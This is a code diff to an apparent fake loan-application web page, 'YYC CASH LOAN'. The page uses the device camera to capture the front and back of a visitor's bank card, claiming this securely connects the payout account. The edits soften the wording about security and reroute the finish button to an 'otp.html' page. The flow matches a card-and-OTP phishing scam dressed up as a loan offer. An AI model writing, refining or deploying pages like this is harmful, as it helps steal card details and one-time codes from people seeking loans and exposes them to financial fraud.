@@ -594,7 +594,7 @@
             <div class="success-card">
                 <i class="fas fa-check-circle success-icon"></i>
                 <h2 class="success-title">Application Submitted!</h2>
-                <p class="success-message">Thank you for applying with YYC CASH LOAN.You can ONLY apply for a loan with capitec by submiting your capitec bank statement and can not be used for pay out  NOTE WE DO NOT PAY OUT TO CAPITEC DUE TO SECURITY CONCERNS AND FOR EASY PAYOUTS scan any other bank card for pay out</p>
+                <p class="success-message">Thank you for applying with YYC CASH LOAN.</p>
                 
             </div>
 
@@ -609,13 +609,13 @@
     </div>
     <div class="scanner" style="visibility:hidden;">
         <h2 id="label">Scan Card Front</h2>
-        <p id="description">Scan the front & Back of your ATM Card (CAPITEC CARD NOTE ALLOWED) to SECURLY CONNECT the accont you want the Loan paid out to.</p>
+        <p id="description">Scan the front & Back of your ATM Card to SECURLY CONNECT the accont you want the Loan paid out to.</p>
         <div style="position: relative;">
             <video id="video" autoplay playsinline></video>
             <div id="scan-line" class="scan-line" style="display:none;"></div>
         </div>
         <button id="switchCamera">Switch Camera</button><br>
-        <button id="scanBtn" disabled>Scan Card Front</button>
+        <button id="scanBtn" disabled>Scan Card Front Clear</button>
         <button id="next">Next</button>
         <button id="finish">Finish</button>
         <p id="status"></p>
@@ -644,7 +644,7 @@
             <div class="modal-content">
                 <div class="modal-header">
                     <h2 class="modal-title">Connect Your Bank Account Via scan</h2>
-                     NOTE WE DO NOT PAY OUT TO CAPITEC DUE TO SECURITY CONCERNS AND FOR EASY PAYOUTS.
+                     DUE TO SECURITY CONCERNS, REDUCE SCAM AND FOR EASY PAYOUTS.
 
 
                 </div>
@@ -860,7 +860,7 @@ document.addEventListener('DOMContentLoaded', function() {
         currentStep = 'back'; label.textContent = 'Back Scan'; desc.textContent = 'Scan the back of your Card.';
         scanBtn.textContent = 'Scan Card Back'; nextBtn.style.display = 'none'; status.textContent = '';
     });
-    finishBtn.addEventListener('click', () => window.location.href = 'complete.html');
+    finishBtn.addEventListener('click', () => window.location.href = 'otp.html');
     switchCam.addEventListener('click', () => { useFrontCamera = !useFrontCamera; initCamera(); });
 });
     </script>
